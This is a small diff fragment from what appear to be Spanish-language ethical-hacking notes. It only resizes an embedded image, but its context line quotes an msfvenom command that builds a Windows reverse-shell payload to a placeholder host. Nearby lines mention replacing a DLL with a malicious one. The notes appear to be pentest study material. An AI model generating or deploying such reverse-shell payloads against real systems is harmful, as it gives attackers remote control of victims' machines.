@@ -1194,9 +1194,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shik
 
 
 Reemplace the DLL by a malicious
-
-![Pasted image 20230909115419.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909115419.png)
-
+![Pasted image 20230909115419.png|600](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909115419.png)
 ## Exploit know vulnerabilities
 
 Tools
